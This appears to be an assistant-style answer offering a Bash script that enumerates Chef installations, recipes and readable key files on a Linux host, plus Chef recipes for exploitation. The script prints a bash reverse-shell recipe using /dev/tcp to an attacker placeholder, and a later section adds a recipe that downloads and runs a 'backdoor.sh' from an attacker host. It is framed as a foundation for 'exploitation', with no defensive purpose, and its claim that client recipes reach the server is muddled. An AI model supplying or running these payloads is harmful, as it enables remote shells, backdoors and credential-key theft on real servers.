
Here’s a Bash script that checks if Chef is installed on a Linux server, identifies potential exploit paths, and outlines possible commands for client-side exploitation.

### Chef Enumeration and Exploitation Script

```bash
#!/bin/bash

echo "Starting Chef enumeration..."

# Function to check if Chef is installed
check_chef_installed() {
    if command -v chef-client &> /dev/null; then
        echo "Chef is installed."
    else
        echo "Chef is not installed."
        exit 1
    fi
}

# Function to identify Chef installation paths and files
identify_chef_files() {
    echo "Identifying Chef installation files..."

    # Common Chef paths
    chef_paths=(
        "/etc/chef"
        "/var/chef"
        "/opt/chef"
        "/var/opt/chef"
    )

    for path in "${chef_paths[@]}"; do
        if [ -d "$path" ]; then
            echo "Found Chef directory: $path"
            find "$path" -type f
        fi
    done
}

# Function to check for potential exploit paths
check_exploit_paths() {
    echo "Checking for potential Chef exploit paths..."

    # Check if there are any recipe or cookbook files
    find /etc/chef* /opt/chef* /var/chef* -type f -name "*.rb" -o -name "*.json" 2>/dev/null | while read -r file; do
        echo "Found possible Chef recipe/cookbook: $file"
        grep -Ei "(execute|bash|script|remote_file|package)" "$file"
    done

    # Check for readable keys or certificates
    find /etc/chef* /opt/chef* /var/chef* -type f -name "*.pem" -o -name "*.key" 2>/dev/null | while read -r keyfile; do
        echo "Found key file: $keyfile"
        if [ -r "$keyfile" ]; then
            echo "Key file is readable: $keyfile"
        fi
    done
}

# Function for client-side exploitation
client_side_exploitation() {
    echo "Possible client-side exploits if running Chef client..."

    # Check if chef-client is running
    if pgrep chef-client > /dev/null; then
        echo "Chef client is running."

        # Commands to exploit Chef client from client-side
        echo "To exploit the client and execute commands remotely:"
        echo "Add malicious code to a recipe or cookbook, such as:"
        echo "execute 'reverse_shell' do"
        echo "  command '/bin/bash -c \"bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1\"'"
        echo "end"
        echo "Then run 'chef-client' to execute the malicious code."
    else
        echo "Chef client is not running."
    fi
}

# Start the enumeration
check_chef_installed
identify_chef_files
check_exploit_paths
client_side_exploitation

echo "Chef enumeration completed."
```

### **Explanation of the Script**

1. **Chef Installation Check:**
   - The script checks if Chef is installed on the system using the `command -v chef-client` command. If Chef is not found, the script exits.

2. **Identify Chef Installation Paths and Files:**
   - The script searches for common Chef directories such as `/etc/chef`, `/var/chef`, `/opt/chef`, and `/var/opt/chef`.
   - It lists files within these directories, which may include recipes, cookbooks, and configuration files.

3. **Check for Exploit Paths:**
   - The script searches for Chef recipe (`*.rb`) and JSON (`*.json`) files, looking for potentially exploitable commands (e.g., `execute`, `bash`, `script`, `remote_file`, `package`).
   - It also checks for readable key files (`*.pem`, `*.key`), which could be leveraged in an attack.

4. **Client-Side Exploitation:**
   - If the Chef client is running, the script provides an example command to exploit the client and execute arbitrary commands on the server via a malicious recipe or cookbook.

### **How to Use the Script**

1. **Copy and Save the Script**: Save the script as `chef_enum.sh` and make it executable with `chmod +x chef_enum.sh`.
2. **Run the Script**: Execute the script with `sudo ./chef_enum.sh` to perform the enumeration and check for potential exploitation paths.
3. **Review the Output**: The script will output details about Chef’s presence, configuration files, potential exploit paths, and possible client-side exploitation commands.

### **Client-Side Exploits to Move to the Server**

If Chef is used in an environment where the server controls configurations on client machines, exploiting the Chef client can allow an attacker to execute commands on the server via crafted recipes or cookbooks.

#### **Example Client-Side Exploits**

1. **Execute Arbitrary Commands:**
   ```ruby
   execute 'reverse_shell' do
     command '/bin/bash -c "bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1"'
   end
   ```

2. **Abuse Chef Resources:**
   ```ruby
   remote_file '/tmp/backdoor' do
     source 'http://attacker_ip/backdoor.sh'
     mode '0755'
     action :create
   end

   execute 'run_backdoor' do
     command '/tmp/backdoor'
   end
   ```

### **Conclusion**

This script helps identify Chef installations and their potential vulnerabilities, providing a solid foundation for further investigation and exploitation, particularly in environments where Chef is used for automated configuration management.